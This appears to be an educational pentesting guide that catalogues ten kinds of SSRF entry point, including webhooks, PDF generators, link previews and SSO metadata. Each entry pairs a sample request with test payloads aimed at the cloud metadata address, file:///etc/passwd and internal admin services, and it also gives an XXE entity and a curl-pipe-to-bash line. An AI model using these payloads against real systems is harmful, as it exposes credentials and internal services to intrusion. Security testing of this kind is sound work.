## Primary SSRF Trigger Points

### 1. Image Upload by URL

**The Feature:** Users provide image URL instead of uploading file

**Common Locations:**
- Profile picture upload
- Blog post featured images
- Product image URLs
- Avatar services (Gravatar, etc.)
- Rich text editor image insertion

**Real-World Example:**
```python
# Vulnerable endpoint
POST /api/user/avatar HTTP/1.1
Host: target.com
Content-Type: application/json

{
    "avatar_url": "https://example.com/photo.jpg"
}

# Server does:
# 1. Downloads image from URL
# 2. Saves to local storage
# 3. Returns success

# SSRF Test:
{
    "avatar_url": "http://169.254.169.254/latest/meta-data/"
}







How to Find:

    Look for "Upload from URL" button

    Check API documentation for image_url, avatar_url, photo_url parameters

    Test in rich text editors (paste image URL)

2. Webhook Configurations

The Feature: Users configure URLs where server sends POST requests on events

Common Locations:

    Developer settings

    Integration pages

    Notification settings

    API settings

    CI/CD configuration

Real-World Example:
http

POST /api/webhooks HTTP/1.1
Host: target.com

{
    "event": "order.created",
    "callback_url": "https://my-server.com/webhook"
}

# Server sends POST to callback_url when event occurs

# SSRF Test:
{
    "callback_url": "http://internal-admin:8080/delete-all-users"
}

How to Find:

    Look for "Webhooks", "Callbacks", "Notifications"

    Check "Integrations" section

    Review API settings pages

    Search for webhook_url, callback, endpoint parameters

3. PDF Generators

The Feature: Generate PDF from user-provided URL or HTML

Common Locations:

    Invoice generation

    Report export

    Receipt printers

    Document converters

    Screenshot services

Real-World Example:
http

POST /api/generate-pdf HTTP/1.1
Host: target.com

{
    "url": "https://example.com/page-to-convert",
    "format": "A4"
}

# Server uses headless browser to render URL to PDF

# SSRF Test:
{
    "url": "file:///etc/passwd"  # File read
}
{
    "url": "http://169.254.169.254/"  # Metadata
}
{
    "url": "http://localhost:8080/admin"  # Internal service
}

How to Find:

    Look for "Export to PDF", "Download as PDF"

    Check "Print" or "Generate Report" features

    Test URL parameters like ?url= in PDF endpoints

    Check ?src=, ?source=, ?document= parameters

4. Link Preview / URL Unfurling

The Feature: Shows preview of links shared in messages/comments

Common Locations:

    Chat applications (Slack, Discord, Teams)

    Social media platforms

    Comment sections

    Messaging apps

    CRM systems

Real-World Example:
http

POST /api/preview HTTP/1.1
Host: chat-app.com

{
    "message": "Check this out: https://example.com"
}

# Server fetches URL to extract:
# - Title
# - Description
# - Open Graph images
# - Favicon

# SSRF Test:
{
    "message": "http://169.254.169.254/latest/meta-data/"
}

# Response might show metadata info in error!

How to Find:

    Share URLs in chat/comments

    Check network tab for preview requests

    Look for oEmbed, Open Graph, link preview features

    Test URL shorteners that fetch destination

5. Import/Export Tools

The Feature: Import data from external URL or export to user URL

Common Locations:

    Data migration tools

    Backup/restore features

    RSS feed readers

    CSV/JSON importers

    Database sync tools

Real-World Example:
http

POST /api/import HTTP/1.1
Host: target.com

{
    "import_type": "csv",
    "source_url": "https://my-server.com/data.csv"
}

# Server downloads and processes file from URL

# SSRF Test:
{
    "source_url": "http://internal-db:5432/"
}
{
    "source_url": "http://169.254.169.254/user-data"
}

How to Find:

    Look for "Import from URL" buttons

    Check "Sync from external source"

    Review "Backup" and "Restore" features

    Test RSS feed URL inputs

6. Proxy/Forwarding Features

The Feature: Proxy requests through the server

Common Locations:

    API gateways

    Web accelerators

    Image proxies

    CORS proxies

    Translation services

Real-World Example:
http

GET /proxy?url=https://example.com HTTP/1.1
Host: proxy-service.com

# Server fetches URL and returns content

# SSRF Test:
GET /proxy?url=http://169.254.169.254/

How to Find:

    Search for ?url= parameter

    Look for ?target=, ?dest=, ?redirect=

    Check /?q= that fetches content

    Review API documentation for "proxy" endpoints

7. XML External Entity (XXE) Related

The Feature: Parses XML with external entities

Common Locations:

    SOAP APIs

    RSS readers

    XML uploads

    SVG uploads

    DOCX/XLSX processing

Real-World Example:
xml

<!-- Malicious XML -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>
  <data>&xxe;</data>
</root>

# If XML parser resolves entities → SSRF

How to Find:

    Upload SVG files (XML-based)

    Use RSS feed URLs

    Test SOAP endpoints

    Upload Office documents

8. Federation & SSO Features

The Feature: Fetch identity provider metadata

Common Locations:

    SAML configuration

    OAuth settings

    OpenID Connect

    LDAP sync

    Social login

Real-World Example:
http

POST /admin/saml/setup HTTP/1.1

{
    "idp_metadata_url": "https://identity-provider.com/metadata.xml"
}

# Server fetches metadata from URL

# SSRF Test:
{
    "idp_metadata_url": "http://169.254.169.254/latest/meta-data/"
}

How to Find:

    Check "Single Sign-On" configuration

    Look for "Identity Provider URL" fields

    Review "Federation" settings

    Test "Metadata URL" inputs

9. CI/CD & Build Systems

The Feature: Fetch artifacts, scripts, or configurations from URLs

Common Locations:

    GitHub Actions

    Jenkins plugins

    GitLab CI

    CircleCI orbs

    Docker builds

Real-World Example:
yaml

# GitHub Actions workflow
steps:
  - name: Download script
    run: curl -s ${{ secrets.SCRIPT_URL }} | bash

# SSRF if SCRIPT_URL can be controlled

How to Find:

    Review CI configuration files

    Check for url parameters in build scripts

    Test artifact download features

    Look for external resource fetching

10. Monitoring & Health Checks

The Feature: Check endpoint health by making requests

Common Locations:

    Uptime monitors

    Status pages

    Health dashboards

    Alerting systems

    Log aggregators

Real-World Example:
http

POST /api/monitors HTTP/1.1

{
    "type": "http",
    "url": "https://my-service.com/health",
    "interval": 60
}

# Server checks URL every 60 seconds

# SSRF Test:
{
    "url": "http://internal-service:8080/secret"
}

How to Find:

    Look for "Uptime Robot" alternatives

    Check "Status Page" configurations

    Review "Alert Webhooks"

    Test "Custom Endpoint" inputs
